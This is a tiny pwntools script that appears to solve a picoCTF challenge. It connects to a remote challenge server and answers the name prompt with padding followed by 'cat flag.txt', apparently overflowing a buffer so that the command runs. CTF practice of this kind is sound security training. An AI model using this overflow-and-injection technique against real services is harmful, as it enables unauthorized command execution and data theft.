from pwn import *


p = remote('amiable-citadel.picoctf.net',51887)
payload = b'AAAAAAAAAAcat flag.txt'
p.sendlineafter(b'What is your name?\n',payload)




p.interactive()
